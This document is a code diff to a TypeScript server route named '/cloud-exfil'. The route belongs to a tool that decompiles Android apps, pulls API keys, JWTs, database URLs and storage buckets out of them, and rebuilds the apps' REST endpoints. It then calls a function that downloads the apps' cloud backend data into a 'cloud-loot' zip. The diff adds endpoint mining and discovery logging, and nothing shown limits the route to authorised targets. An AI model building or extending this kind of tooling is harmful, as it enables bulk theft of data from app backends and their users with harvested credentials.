@@ -664,6 +664,7 @@ router.post("/cloud-exfil", async (req: Request, res: Response) => {
     const { deepStaticSecrets } = await import("../hayo/pentest/secretsDeep.js");
     const { exfiltrateAllCloudData } = await import("../hayo/pentest/cloudExfil.js");
     const { extractApiEndpoints } = await import("../hayo/pentest/apiExtract.js");
+    const { mineEndpoints } = await import("../hayo/pentest/endpointMiner.js");
 
     const allFiles = readDirRecursive(sess.decompDir);
     const TEXT = new Set([".xml", ".smali", ".json", ".txt", ".js", ".java", ".kt", ".properties", ".html", ".gradle", ".cfg", ".yml", ".yaml", ".md", ".pem", ".env", ".so"]);
@@ -684,8 +685,22 @@ router.post("/cloud-exfil", async (req: Request, res: Response) => {
     }
 
     // Mine the app's own REST backend endpoints + candidate keys so custom APIs
-    // (not just Firebase/S3) get fully paginated + downloaded.
-    const restEndpoints = extractApiEndpoints(textFiles, sess.decompDir, readText);
+    // (not just Firebase/S3) get fully paginated + downloaded. Combine TWO
+    // discovery paths: literal full-URL extraction AND the endpoint miner
+    // (reconstructs host+path from separate string constants), then rebuild
+    // full URLs from the miner's primary host for path-only templates.
+    const literalEndpoints = extractApiEndpoints(textFiles, sess.decompDir, readText);
+    const map = mineEndpoints(textFiles, sess.decompDir, readText);
+    const minedUrls: string[] = [];
+    for (const e of map.endpoints) {
+      if (/^https?:\/\//i.test(e.url)) { minedUrls.push(e.url); continue; }
+      // Path-only template → prefix with the mined primary host. Skip unresolved
+      // {placeholders} (they'd 404); keep aptoide-style concrete paths.
+      if (map.host && e.url.startsWith("/") && !/\{[^}]+\}/.test(e.url)) {
+        minedUrls.push(`https://${map.host}${e.url}`);
+      }
+    }
+    const restEndpoints = [...new Set([...literalEndpoints, ...minedUrls])];
     const restKeys = [...new Set([
       ...deep.cloud.apiKeys,
       ...deep.cloud.jwts,
@@ -693,12 +708,29 @@ router.post("/cloud-exfil", async (req: Request, res: Response) => {
     ])];
 
     const pkg = (sess as any).package || sessionId.slice(0, 8);
+    // Diagnostics: what did we discover to attempt exfil with?
+    const discovery = {
+      apiKeys: deep.cloud.apiKeys.size,
+      dbUrls: deep.cloud.dbUrls.size,
+      projectIds: deep.cloud.projectIds.size,
+      firebaseBuckets: deep.cloud.buckets.size,
+      s3Buckets: deep.cloud.s3Buckets.size,
+      restEndpoints: restEndpoints.length,
+      restKeys: restKeys.length,
+    };
+    console.log(`[cloud-exfil] session=${sessionId} discovery=${JSON.stringify(discovery)}`);
+
     const result = await exfiltrateAllCloudData(deep.cloud, pkg, { endpoints: restEndpoints, keys: restKeys });
 
     let downloadId: string | undefined;
     if (result.ok && result.zipPath) {
       downloadId = `dl_exfil_${Date.now()}`;
       uploadStore.set(downloadId, { filePath: result.zipPath, fileName: `cloud-loot-${pkg}.zip`, uploadedAt: Date.now() });
+    }
+    // When nothing was pulled, surface WHAT was attempted so the user isn't blind.
+    const log = [...result.log];
+    if (!result.ok) {
+      log.unshift(`فُحص: ${discovery.apiKeys} مفتاح · ${discovery.dbUrls} RTDB · ${discovery.projectIds} Firestore · ${discovery.firebaseBuckets + discovery.s3Buckets} تخزين · ${discovery.restEndpoints} نقطة REST (بـ ${discovery.restKeys} مفتاح)`);
     }
     res.json({
       success: result.ok,
@@ -709,7 +741,8 @@ router.post("/cloud-exfil", async (req: Request, res: Response) => {
       backends: result.backends,
       authUsed: result.authUsed,
       files: result.files.slice(0, 500),
-      log: result.log,
+      discovery,
+      log,
       error: result.error,
     });
   } catch (e: any) { res.status(500).json({ error: e.message }); }
